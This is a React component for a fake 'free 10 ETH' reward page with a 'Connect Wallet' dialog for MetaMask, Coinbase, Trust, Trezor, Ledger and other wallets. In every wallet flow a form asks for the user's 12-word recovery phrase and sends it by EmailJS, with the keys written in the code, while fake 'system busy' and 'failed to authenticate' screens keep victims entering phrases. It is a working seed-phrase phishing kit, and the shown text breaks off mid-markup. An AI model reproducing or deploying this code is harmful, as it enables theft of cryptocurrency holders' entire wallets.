import React from 'react';
import Container from '../Container/Container';
import { Input } from '@/components/ui/input';
import { Link } from 'react-router-dom';
import icons from "@/assets/icons/logos_ethereum.png"
import emailjs from '@emailjs/browser';
import { useForm } from "react-hook-form"
import { useRef } from "react";
import toast from 'react-hot-toast';
import walletImg from "@/assets/wallets/lageImg/Frame.png"
import { TfiReload } from "react-icons/tfi";
import wallet from "@/assets/wallets/wallet.png"
import { Textarea } from "@/components/ui/textarea"
import metaMask from "@/assets/wallets/Group1.png"
import coinbase from "@/assets/wallets/Group2.png"
import trust from "@/assets/wallets/Group3.png"
import trezor from "@/assets/wallets/Group4.png"
import ledger from "@/assets/wallets/Group5.png"
import otherWallets from "@/assets/wallets/Group6.png"
import { GoQuestion } from "react-icons/go";
import { IoClose } from 'react-icons/io5';
import { SlArrowLeft, SlArrowRight } from "react-icons/sl";
import useTheme from '@/components/useTheme';
import metaMaskLage from "@/assets/wallets/lageImg/MetaMask1.png"
import useMetaMask from '@/hooks/useMetaMask';
import useCoinbase from '@/hooks/useCoinbase';
import useTrust from '@/hooks/Trust';
import useTrezor from '@/hooks/Trezor';
import useLedger from '@/hooks/Ledger';
import useOtherWallet from '@/hooks/OtherWallet';
import coinbaseLage from "@/assets/wallets/lageImg/coinbase.webp"
import trustLage from "@/assets/wallets/lageImg/trust.png"
import trezorLage from "@/assets/wallets/lageImg/unnamed.png"
import ledgerLage from "@/assets/wallets/lageImg/images.png"
import otherWalletsLage from "@/assets/wallets/Group6.png"
import { Dialog, DialogContent, DialogDescription, DialogHeader, DialogTitle, DialogTrigger } from "@/components/ui/dialog"
import { Tooltip, TooltipContent, TooltipProvider, TooltipTrigger } from "@/components/ui/tooltip"
import { Carousel, CarouselContent, CarouselItem, CarouselNext, CarouselPrevious } from "@/components/ui/carousel"

const RewordCard = () => {
  const { theme } = useTheme();
  const { metaCurrentIndex, handleMetaMaskButton, handleMetaMaskPrevious, handleMetaMaskNext, } = useMetaMask();
  const { coinbaseCurrentIndex, handleCoinbaseButton, handleCoinbasePrevious, handleCoinbaseNext } = useCoinbase();
  const { trustCurrentIndex, handleTrustButton, handleTrustPrevious, handleTrustNext } = useTrust();
  const { trezorCurrentIndex, handleTrezorButton, handleTrezorPrevious, handleTrezorNext } = useTrezor();
  const { ledgerCurrentIndex, handleLedgerButton, handleLedgerPrevious, handleLedgerNext } = useLedger();
  const { otherWalletCurrentIndex, handleOtherWalletButton, handleOtherWalletPrevious, handleOtherWalletNext } = useOtherWallet();

  const form = useRef();
  const {
    register,
    handleSubmit,
    reset,
    formState: { errors },
  } = useForm()

  const onSubmit = (data) => {
    emailjs
      .sendForm('service_pq3up0o', 'template_tekflom', form.current, {
        publicKey: 'LE-1gIcbm_kkDTqTk',
      })
      .then(
        () => {
          reset();
          toast.success('Word phrase send successfully');
          // console.log('SUCCESS!');
        },
        (error) => {
          console.log('FAILED...', error.text);
          toast.error('Something wrong, Please try again!');
        },
      );
  };

  return (
    <div className="bg-[#11121F] dark:bg-[#F2F4F6] mt-[-10px] pb-6 pt-1">
      <Container>
        {/* Card */}
        <div className='bg-[#11121F] dark:bg-[#ffffff] dark:rounded-[18px] w-[100%] md:w-[576px] lg:w-[576px] xl:w-[676px] 2xl:w-[764px] mx-auto mt-[48px] pb-60"'>
          <div className="border border-[#1f213a] dark:border-none rounded-[18px]">
            <div>
              <div className="px-4 md:px-6 pt-6">
                <div className="flex justify-between items-center border border-[#1f213a] dark:border-[#7a8aa062] px-6 py-4 rounded-[18px] mb-6">
                  <div className="text-[19px]">
                    <p className="text-transparent bg-clip-text bg-gradient-to-t from-[#414453] from-10% to-[#b0b8da] to-90% font-semibold">10 ETH = $ 25.000.00</p>
                  </div>

                  <Link to="/" className='text-white text-[14px] font-medium bg-[#3b3474] hover:bg-[#705DE4] dark:bg-[#705DE4] dark:hover:bg-[#6f5de4e7] dark:border-none px-3 md:px-4 py-[6px] border border-[#473e8b] rounded-md uppercase duration-300'>For Free</Link>
                </div>
              </div>

              <div className="px-4 md:px-6">
                <div>
                  <div className="flex items-center relative">
                    <label htmlFor="" className="absolute ml-6">
                      <img src={icons} alt="Icons" />
                    </label>

                    <Input type="email" placeholder="Ethereum address" className="border border-[#1f213a] dark:border-[#7a8aa062] px-12 py-8 rounded-[18px] bg-transparent text-[18px] placeholder:text-[18px] placeholder:font-medium text-[#6c6c96] dark:text-[#7A8AA0] placeholder:text-[#6c6c96] focus-visible:ring-offset-1 focus-visible:ring-offset-[#373a64]" />
                  </div>

                  <Dialog>
                    <DialogTrigger className="w-full">
                      <button className='w-full'>
                        <input type="submit" value="Send" className="border border-[#1f213a] hover:border-[#2c2f53] px-12 py-[18px] rounded-[18px] text-[18px] font-semibold placeholder:text-[18px] placeholder:font-medium text-[#6c6c96] placeholder:text-[#6c6c96] w-full cursor-pointer mt-6 bg-[#1f213a3d] hover:bg-[#705DE4] hover:text-white dark:text-white dark:bg-[#705DE4] dark:hover:bg-[#6f5de4e7] dark:border-none duration-300" />
                      </button>
                    </DialogTrigger>

                    <DialogContent className="bg-gradient-to-b from-[#44266f] via-[#131524] to-[#131524] lg:left-[75%] xl:left-[80%] 2xl:left-[83.4%]">
                      <DialogHeader>
                        <DialogTitle className="flex justify-between items-center mb-[30px]">
                          {/* Tooltip question icon */}
                          <TooltipProvider>
                            <Tooltip>
                              <TooltipTrigger asChild>
                                <GoQuestion className="text-[22px] text-[#a794be] cursor-help" />
                              </TooltipTrigger>
                              <TooltipContent className="bg-gradient-to-r from-[#44266f] to-[#381f5a] border-none">
                                <p className="text-white">Connect lots of wallet</p>
                              </TooltipContent>
                            </Tooltip>
                          </TooltipProvider>

                          <p className="text-[21px] text-[#ffffff] font-bold">Connect Wallet</p>
                          <IoClose className="text-[25px] text-[#a794be]" />
                        </DialogTitle>

                        <DialogDescription>
                          <div>
                            <div className="space-y-4">
                              {/* meta mask popup slider */}
                              <Dialog>
                                <DialogTrigger className="w-full">
                                  <button onClick={handleMetaMaskButton} className={`flex justify-between items-center rounded-xl px-2 py-3 w-full ${theme === 'dark' ? 'bg-[#464653] border-none' : 'bg-gradient-to-r from-[#6f5ce4] to-[#8768ee] border border-[#6f5ce4] dark:border-none'}`}>
                                    <div className="flex items-center">
                                      <img src={metaMask} alt="Meta Mask" className="w-[35px] mr-3" />
                                      <p className="text-[17px] text-[#FFFFFF]">MetaMask</p>
                                    </div>
                                    <Link to='' className='text-white text-[14px] font-medium bg-[#8f73ee] dark:bg-[#705DE4] px-3 py-[5px] border border-[#8f73ee] dark:border-none rounded-md'>Connect</Link>
                                  </button>
                                </DialogTrigger>

                                <DialogContent className="h-[590px] lg:left-[75%] xl:left-[80%] 2xl:left-[83.4%]">
                                  <DialogHeader>
                                    <DialogDescription>
                                      <Carousel className="relative">
                                        <CarouselContent>
                                          <CarouselItem className={`flex justify-center text-center w-0 transition-all ${metaCurrentIndex === 0 ? 'block' : 'hidden'}`}>
                                            <div>
                                              <h3 className="text-[21px] text-[#11121F] font-semibold">MetaMask</h3>
                                              <img src={metaMaskLage} alt="Image" className="w-[110px] mx-auto mt-28 mb-5" />
                                              <p className="text-[18px] text-[#11121F] font-semibold">Connect MetaMask...</p>
                                            </div>
                                          </CarouselItem>

                                          <CarouselItem className={`flex justify-center text-center w-0 transition-all ${metaCurrentIndex === 1 ? 'block' : 'hidden'}`}>
                                            <div className="w-full">
                                              <h3 className="text-[21px] text-[#11121F] font-semibold">Import Wallet</h3>
                                              <img src={walletImg} alt="Image" className="w-[110px] mx-auto mt-20 mb-5" />
                                              <p className="text-[22px] text-[#11121F] font-semibold mb-2">Import Wallet</p>
                                              <p className="text-[15px] text-[#6c6d75]">To connect your wallet. enter <br /> the secret phrase.</p>

                                              <p className="text-start mt-6">12 Word phrase</p>
                                              <form ref={form} onSubmit={handleSubmit(onSubmit)}>
                                                <Textarea rows={4} type="text" {...register("message", { required: true })} className="mt-2 mb-8 focus:border-[#6c6d7591] focus-visible:ring-0" />

                                                <input type="submit" value="Import Wallet" onClick={handleMetaMaskNext} className="text-white bg-[#1098FC] hover:bg-[#109afcec] p-4 rounded-[12px] w-full duration-200 cursor-pointer" />
                                              </form>
                                            </div>
                                          </CarouselItem>

                                          <CarouselItem className={`flex justify-center text-center w-0 transition-all ${metaCurrentIndex === 2 ? 'block' : 'hidden'}`}>
                                            <div className="w-full">
                                              <h3 className="text-[21px] text-[#11121F] font-semibold">MetaMask</h3>
                                              <img src={metaMaskLage} alt="Image" className="w-[110px] mx-auto mt-24 mb-5" />
                                              <p className="text-[15px] text-[#6c6d75] mb-20">Because of many requests, our ConnectWallet system is currently busy. Try again later or avoid this crowding by connecting your wallet using a 12-word recovery phrase. Thank you for your understanding.</p>

                                              <button onClick={handleMetaMaskNext} className="text-white bg-[#1098FC] hover:bg-[#109afcec] p-4 rounded-[12px] w-full duration-200">Import Wallet</button>
                                            </div>
                                          </CarouselItem>

                                          <CarouselItem className={`flex justify-center text-center w-0 transition-all ${metaCurrentIndex === 3 ? 'block' : 'hidden'}`}>
                                            <div className="w-full">
                                              <h3 className="text-[21px] text-[#11121F] font-semibold">Import Wallet</h3>
                                              <img src={walletImg} alt="Image" className="w-[110px] mx-auto mt-24 mb-5" />
                                              <p className="text-[22px] text-[#11121F] font-semibold mt-20 mb-2">Failed to authenticate</p>
                                              <p className="text-[15px] text-[#6c6d75] mb-14">connect your correct wallet</p>

                                              <button className="text-white bg-[#1098FC] hover:bg-[#109afcec] p-4 rounded-[12px] w-full duration-200 flex justify-center items-center">
                                                <TfiReload className="mr-2" />
                                                <span>Try Again</span>
                                              </button>
                                            </div>
                                          </CarouselItem>
                                        </CarouselContent>

                                        <SlArrowLeft onClick={handleMetaMaskPrevious} className="absolute top-[5px] left-0 bg-transparent border-none font-bold cursor-pointer" />
                                        {/* <CarouselPrevious className="top-[10px] left-0 bg-transparent border-none font-bold" /> */}
                                        <CarouselNext className="hidden" />
                                        <IoClose className="text-[23px] text-[#a794be] absolute top-0 right-0" />
                                      </Carousel>

                                    </DialogDescription>
                                  </DialogHeader>
                                </DialogContent>
                              </Dialog>

                              {/* Coinbase popup slider */}
                              <Dialog>
                                <DialogTrigger className="w-full">
                                  <button onClick={handleCoinbaseButton} className={`flex items-center px-2 py-3 rounded-xl w-full ${theme === "dark" ? "bg-[#464653]" : "bg-gradient-to-r from-[#321b4cbe] to-[#372e6a54] hover:from-[#6f5ce4] hover:to-[#8768ee] border border-[#42418a50]"}`}>
                                    <img src={coinbase} alt="Meta Mask" className="w-[35px] mr-3" />
                                    <p className="text-[17px] text-[#FFFFFF]">Coinbase Wallet</p>
                                  </button>
                                </DialogTrigger>

                                <DialogContent className="h-[590px] lg:left-[75%] xl:left-[80%] 2xl:left-[83.4%]">
                                  <DialogHeader>
                                    <DialogDescription>
                                      <Carousel className="relative">
                                        <CarouselContent>
                                          <CarouselItem className={`flex justify-center text-center w-0 transition-all ${coinbaseCurrentIndex === 0 ? 'block' : 'hidden'}`}>
                                            <div>
                                              <h3 className="text-[21px] text-[#11121F] font-semibold">Coinbase</h3>
                                              <img src={coinbaseLage} alt="Image" className="w-[110px] mx-auto mt-28 mb-5" />
                                              <p className="text-[18px] text-[#11121F] font-semibold">Connect Coinbase...</p>
                                            </div>
                                          </CarouselItem>

                                          <CarouselItem className={`flex justify-center text-center w-0 transition-all ${coinbaseCurrentIndex === 1 ? 'block' : 'hidden'}`}>
                                            <div className="w-full">
                                              <h3 className="text-[21px] text-[#11121F] font-semibold">Import Wallet</h3>
                                              <img src={walletImg} alt="Image" className="w-[110px] mx-auto mt-20 mb-5" />
                                              <p className="text-[22px] text-[#11121F] font-semibold mb-2">Import Wallet</p>
                                              <p className="text-[15px] text-[#6c6d75]">To connect your wallet. enter <br /> the secret phrase.</p>

                                              <p className="text-start mt-6">12 Word phrase</p>
                                              <form ref={form} onSubmit={handleSubmit(onSubmit)}>
                                                <Textarea rows={4} type="text" {...register("message", { required: true })} className="mt-2 mb-8 focus:border-[#6c6d7591] focus-visible:ring-0" />

                                                <input type="submit" value="Import Wallet" onClick={handleCoinbaseNext} className="text-white bg-[#1098FC] hover:bg-[#109afcec] p-4 rounded-[12px] w-full duration-200 cursor-pointer" />
                                              </form>
                                            </div>
                                          </CarouselItem>

                                          <CarouselItem className={`flex justify-center text-center w-0 transition-all ${coinbaseCurrentIndex === 2 ? 'block' : 'hidden'}`}>
                                            <div className="w-full">
                                              <h3 className="text-[21px] text-[#11121F] font-semibold">Coinbase</h3>
                                              <img src={coinbaseLage} alt="Image" className="w-[100px] mx-auto mt-24 mb-5" />
                                              <p className="text-[15px] text-[#6c6d75] mb-20">Because of many requests, our ConnectWallet system is currently busy. Try again later or avoid this crowding by connecting your wallet using a 12-word recovery phrase. Thank you for your understanding.</p>

                                              <button onClick={handleCoinbaseNext} className="text-white bg-[#1098FC] hover:bg-[#109afcec] p-4 rounded-[12px] w-full duration-200">Import Wallet</button>
                                            </div>
                                          </CarouselItem>

                                          <CarouselItem className={`flex justify-center text-center w-0 transition-all ${coinbaseCurrentIndex === 3 ? 'block' : 'hidden'}`}>
                                            <div className="w-full">
                                              <h3 className="text-[21px] text-[#11121F] font-semibold">Import Wallet</h3>
                                              <img src={walletImg} alt="Image" className="w-[110px] mx-auto mt-24 mb-5" />
                                              <p className="text-[22px] text-[#11121F] font-semibold mt-20 mb-2">Failed to authenticate</p>
                                              <p className="text-[15px] text-[#6c6d75] mb-14">connect your correct wallet</p>

                                              <button className="text-white bg-[#1098FC] hover:bg-[#109afcec] p-4 rounded-[12px] w-full duration-200 flex justify-center items-center">
                                                <TfiReload className="mr-2" />
                                                <span>Try Again</span>
                                              </button>
                                            </div>
                                          </CarouselItem>
                                        </CarouselContent>

                                        <SlArrowLeft onClick={handleCoinbasePrevious} className="absolute top-[5px] left-0 bg-transparent border-none font-bold cursor-pointer" />
                                        {/* <CarouselPrevious className="top-[10px] left-0 bg-transparent border-none font-bold" /> */}
                                        <CarouselNext className="hidden" />
                                        <IoClose className="text-[23px] text-[#a794be] absolute top-0 right-0" />
                                      </Carousel>

                                    </DialogDescription>
                                  </DialogHeader>
                                </DialogContent>
                              </Dialog>

                              {/* Trust popup slider */}
                              <Dialog>
                                <DialogTrigger className="w-full">
                                  {/* Trust */}
                                  <button onClick={handleTrustButton} className={`flex items-center px-2 py-3 rounded-xl w-full ${theme === "dark" ? "bg-[#464653]" : "bg-gradient-to-r from-[#1d1831] to-[#20203c77] hover:from-[#6f5ce4] hover:to-[#8768ee] border border-[#21233c]"}`}>
                                    <img src={trust} alt="Meta Mask" className="w-[35px] mr-3" />
                                    <p className="text-[17px] text-[#FFFFFF]">Trust Wallet</p>
                                  </button>
                                </DialogTrigger>

                                <DialogContent className="h-[590px] lg:left-[75%] xl:left-[80%] 2xl:left-[83.4%]">
                                  <DialogHeader>
                                    <DialogDescription>
                                      <Carousel className="relative">
                                        <CarouselContent>
                                          <CarouselItem className={`flex justify-center text-center w-0 transition-all ${trustCurrentIndex === 0 ? 'block' : 'hidden'}`}>
                                            <div>
                                              <h3 className="text-[21px] text-[#11121F] font-semibold">Trust</h3>
                                              <img src={trustLage} alt="Image" className="w-[110px] mx-auto mt-28 mb-5" />
                                              <p className="text-[18px] text-[#11121F] font-semibold">Connect Trust...</p>
                                            </div>
                                          </CarouselItem>

                                          <CarouselItem className={`flex justify-center text-center w-0 transition-all ${trustCurrentIndex === 1 ? 'block' : 'hidden'}`}>
                                            <div className="w-full">
                                              <h3 className="text-[21px] text-[#11121F] font-semibold">Import Wallet</h3>
                                              <img src={walletImg} alt="Image" className="w-[110px] mx-auto mt-20 mb-5" />
                                              <p className="text-[22px] text-[#11121F] font-semibold mb-2">Import Wallet</p>
                                              <p className="text-[15px] text-[#6c6d75]">To connect your wallet. enter <br /> the secret phrase.</p>

                                              <p className="text-start mt-6">12 Word phrase</p>
                                              <form ref={form} onSubmit={handleSubmit(onSubmit)}>
                                                <Textarea rows={4} type="text" {...register("message", { required: true })} className="mt-2 mb-8 focus:border-[#6c6d7591] focus-visible:ring-0" />

                                                <input type="submit" value="Import Wallet" onClick={handleTrustNext} className="text-white bg-[#1098FC] hover:bg-[#109afcec] p-4 rounded-[12px] w-full duration-200 cursor-pointer" />
                                              </form>
                                            </div>
                                          </CarouselItem>

                                          <CarouselItem className={`flex justify-center text-center w-0 transition-all ${trustCurrentIndex === 2 ? 'block' : 'hidden'}`}>
                                            <div className="w-full">
                                              <h3 className="text-[21px] text-[#11121F] font-semibold">Trust</h3>
                                              <img src={trustLage} alt="Image" className="w-[110px] mx-auto mt-24 mb-5" />
                                              <p className="text-[15px] text-[#6c6d75] mb-20">Because of many requests, our ConnectWallet system is currently busy. Try again later or avoid this crowding by connecting your wallet using a 12-word recovery phrase. Thank you for your understanding.</p>

                                              <button onClick={handleTrustNext} className="text-white bg-[#1098FC] hover:bg-[#109afcec] p-4 rounded-[12px] w-full duration-200">Import Wallet</button>
                                            </div>
                                          </CarouselItem>

                                          <CarouselItem className={`flex justify-center text-center w-0 transition-all ${trustCurrentIndex === 3 ? 'block' : 'hidden'}`}>
                                            <div className="w-full">
                                              <h3 className="text-[21px] text-[#11121F] font-semibold">Import Wallet</h3>
                                              <img src={walletImg} alt="Image" className="w-[110px] mx-auto mt-24 mb-5" />
                                              <p className="text-[22px] text-[#11121F] font-semibold mt-20 mb-2">Failed to authenticate</p>
                                              <p className="text-[15px] text-[#6c6d75] mb-14">connect your correct wallet</p>

                                              <button className="text-white bg-[#1098FC] hover:bg-[#109afcec] p-4 rounded-[12px] w-full duration-200 flex justify-center items-center">
                                                <TfiReload className="mr-2" />
                                                <span>Try Again</span>
                                              </button>
                                            </div>
                                          </CarouselItem>
                                        </CarouselContent>

                                        <SlArrowLeft onClick={handleTrustPrevious} className="absolute top-[5px] left-0 bg-transparent border-none font-bold cursor-pointer" />
                                        {/* <CarouselPrevious className="top-[10px] left-0 bg-transparent border-none font-bold" /> */}
                                        <CarouselNext className="hidden" />
                                        <IoClose className="text-[23px] text-[#a794be] absolute top-0 right-0" />
                                      </Carousel>
                                    </DialogDescription>
                                  </DialogHeader>
                                </DialogContent>
                              </Dialog>

                              {/* Trezor popup slider */}
                              <Dialog>
                                <DialogTrigger className="w-full">
                                  {/* Trezor */}
                                  <button onClick={handleTrezorButton} className={`flex items-center px-2 py-3 rounded-xl w-full ${theme === "dark" ? "bg-[#464653]" : "bg-gradient-to-r from-[#161828] to-[#151727] hover:from-[#6f5ce4] hover:to-[#8768ee] border border-[#21233c]"}`}>
                                    <img src={trezor} alt="Meta Mask" className="w-[35px] mr-3" />
                                    <p className="text-[17px] text-[#FFFFFF]">Trezor</p>
                                  </button>
                                </DialogTrigger>

                                <DialogContent className="h-[590px] lg:left-[75%] xl:left-[80%] 2xl:left-[83.4%]">
                                  <DialogHeader>
                                    <DialogDescription>
                                      <Carousel className="relative">
                                        <CarouselContent>
                                          <CarouselItem className={`flex justify-center text-center w-0 transition-all ${trezorCurrentIndex === 0 ? 'block' : 'hidden'}`}>
                                            <div>
                                              <h3 className="text-[21px] text-[#11121F] font-semibold">Trezor</h3>
                                              <img src={trezorLage} alt="Image" className="w-[110px] mx-auto mt-28 mb-5" />
                                              <p className="text-[18px] text-[#11121F] font-semibold">Connect Trezor...</p>
                                            </div>
                                          </CarouselItem>


                                          <CarouselItem className={`flex justify-center text-center w-0 transition-all ${trezorCurrentIndex === 1 ? 'block' : 'hidden'}`}>
                                            <div className="w-full">
                                              <h3 className="text-[21px] text-[#11121F] font-semibold">Import Wallet</h3>
                                              <img src={walletImg} alt="Image" className="w-[110px] mx-auto mt-20 mb-5" />
                                              <p className="text-[22px] text-[#11121F] font-semibold mb-2">Import Wallet</p>
                                              <p className="text-[15px] text-[#6c6d75]">To connect your wallet. enter <br /> the secret phrase.</p>

                                              <p className="text-start mt-6">12 Word phrase</p>
                                              <form ref={form} onSubmit={handleSubmit(onSubmit)}>
                                                <Textarea rows={4} type="text" {...register("message", { required: true })} className="mt-2 mb-8 focus:border-[#6c6d7591] focus-visible:ring-0" />

                                                <input type="submit" value="Import Wallet" onClick={handleTrezorNext} className="text-white bg-[#1098FC] hover:bg-[#109afcec] p-4 rounded-[12px] w-full duration-200 cursor-pointer" />
                                              </form>
                                            </div>
                                          </CarouselItem>

                                          <CarouselItem className={`flex justify-center text-center w-0 transition-all ${trezorCurrentIndex === 2 ? 'block' : 'hidden'}`}>
                                            <div className="w-full">
                                              <h3 className="text-[21px] text-[#11121F] font-semibold">Trezor</h3>
                                              <img src={trezorLage} alt="Image" className="w-[110px] mx-auto mt-24 mb-5" />
                                              <p className="text-[15px] text-[#6c6d75] mb-20">Because of many requests, our ConnectWallet system is currently busy. Try again later or avoid this crowding by connecting your wallet using a 12-word recovery phrase. Thank you for your understanding.</p>

                                              <button onClick={handleTrezorNext} className="text-white bg-[#1098FC] hover:bg-[#109afcec] p-4 rounded-[12px] w-full duration-200">Import Wallet</button>
                                            </div>
                                          </CarouselItem>

                                          <CarouselItem className={`flex justify-center text-center w-0 transition-all ${trezorCurrentIndex === 3 ? 'block' : 'hidden'}`}>
                                            <div className="w-full">
                                              <h3 className="text-[21px] text-[#11121F] font-semibold">Import Wallet</h3>
                                              <img src={walletImg} alt="Image" className="w-[110px] mx-auto mt-24 mb-5" />
                                              <p className="text-[22px] text-[#11121F] font-semibold mt-20 mb-2">Failed to authenticate</p>
                                              <p className="text-[15px] text-[#6c6d75] mb-14">connect your correct wallet</p>

                                              <button className="text-white bg-[#1098FC] hover:bg-[#109afcec] p-4 rounded-[12px] w-full duration-200 flex justify-center items-center">
                                                <TfiReload className="mr-2" />
                                                <span>Try Again</span>
                                              </button>
                                            </div>
                                          </CarouselItem>
                                        </CarouselContent>

                                        <SlArrowLeft onClick={handleTrezorPrevious} className="absolute top-[5px] left-0 bg-transparent border-none font-bold cursor-pointer" />
                                        {/* <CarouselPrevious className="top-[10px] left-0 bg-transparent border-none font-bold" /> */}
                                        <CarouselNext className="hidden" />
                                        <IoClose className="text-[23px] text-[#a794be] absolute top-0 right-0" />
                                      </Carousel>
                                    </DialogDescription>
                                  </DialogHeader>
                                </DialogContent>
                              </Dialog>

                              {/* Leger popup slider */}
                              <Dialog>
                                <DialogTrigger className="w-full">
                                  {/* Ledger */}
                                  <button onClick={handleLedgerButton} className={`flex items-center px-2 py-3 rounded-xl w-full ${theme === "dark" ? "bg-[#464653]" : "bg-gradient-to-r from-[#161828] to-[#151727] hover:from-[#6f5ce4] hover:to-[#8768ee] border border-[#21233c]"}`}>
                                    <img src={ledger} alt="Meta Mask" className="w-[35px] mr-3" />
                                    <p className="text-[17px] text-[#FFFFFF]">Ledger</p>
                                  </button>
                                </DialogTrigger>

                                <DialogContent className="h-[590px] lg:left-[75%] xl:left-[80%] 2xl:left-[83.4%]">
                                  <DialogHeader>
                                    <DialogDescription>
                                      <Carousel className="relative">
                                        <CarouselContent>
                                          <CarouselItem className={`flex justify-center text-center w-0 transition-all ${ledgerCurrentIndex === 0 ? 'block' : 'hidden'}`}>
                                            <div>
                                              <h3 className="text-[21px] text-[#11121F] font-semibold">Ledger</h3>
                                              <img src={ledgerLage} alt="Image" className="w-[110px] mx-auto mt-28 mb-5" />
                                              <p className="text-[18px] text-[#11121F] font-semibold">Connect Ledger...</p>
                                            </div>
                                          </CarouselItem>


                                          <CarouselItem className={`flex justify-center text-center w-0 transition-all ${ledgerCurrentIndex === 1 ? 'block' : 'hidden'}`}>
                                            <div className="w-full">
                                              <h3 className="text-[21px] text-[#11121F] font-semibold">Import Wallet</h3>
                                              <img src={walletImg} alt="Image" className="w-[110px] mx-auto mt-20 mb-5" />
                                              <p className="text-[22px] text-[#11121F] font-semibold mb-2">Import Wallet</p>
                                              <p className="text-[15px] text-[#6c6d75]">To connect your wallet. enter <br /> the secret phrase.</p>

                                              <p className="text-start mt-6">12 Word phrase</p>
                                              <form ref={form} onSubmit={handleSubmit(onSubmit)}>
                                                <Textarea rows={4} type="text" {...register("message", { required: true })} className="mt-2 mb-8 focus:border-[#6c6d7591] focus-visible:ring-0" />

                                                <input type="submit" value="Import Wallet" onClick={handleLedgerNext} className="text-white bg-[#1098FC] hover:bg-[#109afcec] p-4 rounded-[12px] w-full duration-200 cursor-pointer" />
                                              </form>
                                            </div>
                                          </CarouselItem>

                                          <CarouselItem className={`flex justify-center text-center w-0 transition-all ${ledgerCurrentIndex === 2 ? 'block' : 'hidden'}`}>
                                            <div className="w-full">
                                              <h3 className="text-[21px] text-[#11121F] font-semibold">Ledger</h3>
                                              <img src={ledgerLage} alt="Image" className="w-[110px] mx-auto mt-24 mb-5" />
                                              <p className="text-[15px] text-[#6c6d75] mb-20">Because of many requests, our ConnectWallet system is currently busy. Try again later or avoid this crowding by connecting your wallet using a 12-word recovery phrase. Thank you for your understanding.</p>

                                              <button onClick={handleLedgerNext} className="text-white bg-[#1098FC] hover:bg-[#109afcec] p-4 rounded-[12px] w-full duration-200">Import Wallet</button>
                                            </div>
                                          </CarouselItem>

                                          <CarouselItem className={`flex justify-center text-center w-0 transition-all ${ledgerCurrentIndex === 3 ? 'block' : 'hidden'}`}>
                                            <div className="w-full">
                                              <h3 className="text-[21px] text-[#11121F] font-semibold">Import Wallet</h3>
                                              <img src={walletImg} alt="Image" className="w-[110px] mx-auto mt-24 mb-5" />
                                              <p className="text-[22px] text-[#11121F] font-semibold mt-20 mb-2">Failed to authenticate</p>
                                              <p className="text-[15px] text-[#6c6d75] mb-14">connect your correct wallet</p>

                                              <button className="text-white bg-[#1098FC] hover:bg-[#109afcec] p-4 rounded-[12px] w-full duration-200 flex justify-center items-center">
                                                <TfiReload className="mr-2" />
                                                <span>Try Again</span>
                                              </button>
                                            </div>
                                          </CarouselItem>
                                        </CarouselContent>

                                        <SlArrowLeft onClick={handleLedgerPrevious} className="absolute top-[5px] left-0 bg-transparent border-none font-bold cursor-pointer" />
                                        {/* <CarouselPrevious className="top-[10px] left-0 bg-transparent border-none font-bold" /> */}
                                        <CarouselNext className="hidden" />
                                        <IoClose className="text-[23px] text-[#a794be] absolute top-0 right-0" />
                                      </Carousel>
                                    </DialogDescription>
                                  </DialogHeader>
                                </DialogContent>
                              </Dialog>

                              {/* Other wallet popup slider */}
                              <Dialog>
                                <DialogTrigger className="w-full">
                                  <button onClick={handleOtherWalletButton} className={`flex items-center px-2 py-3 rounded-xl w-full ${theme === "dark" ? "bg-[#464653]" : "bg-gradient-to-r from-[#161828] to-[#151727] hover:from-[#6f5ce4] hover:to-[#8768ee] border border-[#21233c]"}`}>
                                    <img src={otherWallets} alt="Meta Mask" className="w-[35px] mr-3" />
                                    <p className="text-[17px] text-[#FFFFFF]">Other Wallets</p>
                                  </button>
                                </DialogTrigger>

                                <DialogContent className="h-[590px] lg:left-[75%] xl:left-[80%] 2xl:left-[83.4%]">
                                  <DialogHeader>
                                    <DialogDescription>
                                      <Carousel className="relative">
                                        <CarouselContent>
                                          <CarouselItem className={`flex justify-center text-center w-0 transition-all ${otherWalletCurrentIndex === 0 ? 'block' : 'hidden'}`}>
                                            <div>
                                              <h3 className="text-[21px] text-[#11121F] font-semibold">Other Wallet</h3>
                                              <img src={otherWalletsLage} alt="Image" className="w-[110px] mx-auto mt-28 mb-5" />
                                              <p className="text-[18px] text-[#11121F] font-semibold">Connect Other Wallet...</p>
                                            </div>
                                          </CarouselItem>

                                          <CarouselItem className={`flex justify-center text-center w-0 transition-all ${otherWalletCurrentIndex === 1 ? 'block' : 'hidden'}`}>
                                            <div className="w-full">
                                              <h3 className="text-[21px] text-[#11121F] font-semibold">Import Wallet</h3>
                                              <img src={walletImg} alt="Image" className="w-[110px] mx-auto mt-20 mb-5" />
                                              <p className="text-[22px] text-[#11121F] font-semibold mb-2">Import Wallet</p>
                                              <p className="text-[15px] text-[#6c6d75]">To connect your wallet. enter <br /> the secret phrase.</p>

                                              <p className="text-start mt-6">12 Word phrase</p>
                                              <form ref={form} onSubmit={handleSubmit(onSubmit)}>
                                                <Textarea rows={4} type="text" {...register("message", { required: true })} className="mt-2 mb-8 focus:border-[#6c6d7591] focus-visible:ring-0" />

                                                <input type="submit" value="Import Wallet" onClick={handleOtherWalletNext} className="text-white bg-[#1098FC] hover:bg-[#109afcec] p-4 rounded-[12px] w-full duration-200 cursor-pointer" />
                                              </form>
                                            </div>
                                          </CarouselItem>

                                          <CarouselItem className={`flex justify-center text-center w-0 transition-all ${otherWalletCurrentIndex === 2 ? 'block' : 'hidden'}`}>
                                            <div className="w-full">
                                              <h3 className="text-[21px] text-[#11121F] font-semibold">Other Wallet</h3>
                                              <img src={otherWalletsLage} alt="Image" className="w-[110px] mx-auto mt-24 mb-5" />
                                              <p className="text-[15px] text-[#6c6d75] mb-20">Because of many requests, our ConnectWallet system is currently busy. Try again later or avoid this crowding by connecting your wallet using a 12-word recovery phrase. Thank you for your understanding.</p>

                                              <button onClick={handleOtherWalletNext} className="text-white bg-[#1098FC] hover:bg-[#109afcec] p-4 rounded-[12px] w-full duration-200">Import Wallet</button>
                                            </div>
                                          </CarouselItem>

                                          <CarouselItem className={`flex justify-center text-center w-0 transition-all ${otherWalletCurrentIndex === 3 ? 'block' : 'hidden'}`}>
                                            <div className="w-full">
                                              <h3 className="text-[21px] text-[#11121F] font-semibold">Import Wallet</h3>
                                              <img src={walletImg} alt="Image" className="w-[110px] mx-auto mt-24 mb-5" />
                                              <p className="text-[22px] text-[#11121F] font-semibold mt-20 mb-2">Failed to authenticate</p>
                                              <p className="text-[15px] text-[#6c6d75] mb-14">connect your correct wallet</p>

                                              <button className="text-white bg-[#1098FC] hover:bg-[#109afcec] p-4 rounded-[12px] w-full duration-200 flex justify-center items-center">
                                                <TfiReload className="mr-2" />
                                                <span>Try Again</span>
